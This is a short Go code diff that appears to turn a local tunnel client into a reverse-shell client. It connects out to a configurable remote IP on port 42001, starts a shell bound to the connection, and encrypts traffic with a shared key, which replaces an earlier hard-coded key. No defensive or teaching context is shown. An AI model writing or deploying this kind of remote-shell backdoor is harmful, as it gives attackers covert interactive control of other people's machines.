@@ -4,16 +4,19 @@ import (
 	"log"
 	"net"
 	"time"
+	"fmt"
 )
 
 
 func StartConnection(out chan []byte,in chan []byte){
-	conn, err := net.Dial("tcp", "localhost:42001")
+	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%s", ip, "42001"))
     if err != nil {
         log.Println("Could not connect to server to build tunnel:", err)
         return
     }
     defer conn.Close()
+
+	go StartShell(out, in)
 
 	go func(){ //keep the cnx alive
 		for {
@@ -31,7 +34,11 @@ func StartConnection(out chan []byte,in chan []byte){
 	go func(){
 		for {
 			stream := <- out
-			_, err := conn.Write(stream)
+			cipher, err := Encrypt([]byte(key), string(stream))
+			if err != nil {
+				panic("PANIC")
+			}
+			_, err = conn.Write([]byte(cipher))
 			if err != nil {
 				log.Println("connection to server dropped!")
 				conn.Close() //TODO this will break fix it
@@ -50,7 +57,7 @@ func StartConnection(out chan []byte,in chan []byte){
 			return
 		}
 
-		text, err := Decrypt([]byte("hellohellohellohellohellohellohe"), string(data[:k]))
+		text, err := Decrypt([]byte(key), string(data[:k]))
         if err != nil {
             log.Println("error decrypting", err)
             panic("PANIC")
